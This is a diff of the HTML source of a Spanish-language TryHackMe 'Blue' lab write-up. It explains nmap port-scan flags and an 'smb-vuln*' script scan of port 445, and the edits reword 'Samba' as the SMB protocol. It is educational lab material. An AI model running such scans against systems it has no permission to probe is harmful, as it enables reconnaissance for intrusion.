+  &lt;li&gt;T5 - La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido”, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;White Hat&lt;/code&gt;&lt;/li&gt;
   &lt;li&gt;v - &lt;em&gt;Verbose&lt;/em&gt;, reporta lo encontrado por consola&lt;/li&gt;
   &lt;li&gt;n - No aplicar &lt;em&gt;resolución DNS&lt;/em&gt;&lt;/li&gt;
   &lt;li&gt;sS - Escaneo &lt;em&gt;TCP SYN&lt;/em&gt;&lt;/li&gt;
@@ -1344,11 +1549,11 @@ ssh-keygen
 
 &lt;p&gt;Estas preguntas son bastante fáciles de responder si realizamos un buen escaneo con &lt;em&gt;Nmap&lt;/em&gt;. Para responder a la primera pregunta no hay donde perderse, bastará con introducir cuántos puertos abiertos, inferiores a 1000, hemos detectado con nuestro escaneo; recordemos que existen en total 65535 puertos posibles. Para responder a la segunda pregunta, tendremos que realizar un escaneo adicional, ya que se nos pregunta, a que ataque es vulnerable la máquina; a modo de pista, la plataforma nos da un ejemplo de respuesta: &lt;em&gt;ms08-067&lt;/em&gt;.&lt;/p&gt;
 
-&lt;p&gt;Si recordamos, lo más relevante que encontramos con nuestro escaneo de versiones y servicios con &lt;em&gt;Nmap&lt;/em&gt;, es el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;445&lt;/code&gt;, o servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Samba&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Si recordamos, lo más relevante que encontramos con nuestro escaneo de versiones y servicios con &lt;em&gt;Nmap&lt;/em&gt;, es el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;445&lt;/code&gt;, o protocolo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMB&lt;/code&gt; (Server Message Block).&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;De modo que procederemos a utilizar los scripts específicos con los que cuenta &lt;em&gt;Nmap&lt;/em&gt;, para detectar vulnerabilidades en un servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Samba&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;De modo que procederemos a utilizar los scripts específicos con los que cuenta &lt;em&gt;Nmap&lt;/em&gt;, para detectar vulnerabilidades en dicho protocolo.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-11-15-Blue-TryHackMe/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
@@ -1357,7 +1562,7 @@ ssh-keygen
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;smb-vuln*&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 445 &amp;lt;dirección IP&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;A continuación se explican los parámetros utilizados en el escaneo de vulnerabilidades del servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Samba&lt;/code&gt; con &lt;em&gt;Nmap&lt;/em&gt;:&lt;/p&gt;
+&lt;p&gt;A continuación se explican los parámetros utilizados en el escaneo de vulnerabilidades del protocolo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMB&lt;/code&gt; con &lt;em&gt;Nmap&lt;/em&gt;:&lt;/p&gt;
 
 &lt;ul&gt;
   &lt;li&gt;script - Proporcionamos el script que queremos emplear; en este caso, como no teníamos un script en particular a utilizar, a través de expresiones regulares, indicamos que queremos utilizar todos aquellos scripts que comiencen por &lt;em&gt;smb-vuln&lt;/em&gt;&lt;/li&gt;
@@ -1558,7 +1763,7 @@ type flag3.txt
 &lt;ul&gt;
   &lt;li&gt;p - Escanea todo el rango de puertos (65535 en total)&lt;/li&gt;
   &lt;li&gt;open - Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos)&lt;/li&gt;
-  &lt;li&gt;T5 - La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido  “, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;White Hat&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;T5 - La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido”, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;White Hat&lt;/code&gt;&lt;/li&gt;
   &lt;li&gt;v - &lt;em&gt;Verbose&lt;/em&gt;, reporta lo encontrado por consola&lt;/li&gt;
   &lt;li&gt;n - No aplicar &lt;em&gt;resolución DNS&lt;/em&gt;&lt;/li&gt;
   &lt;li&gt;sS - Escaneo &lt;em&gt;TCP SYN&lt;/em&gt;&lt;/li&gt;
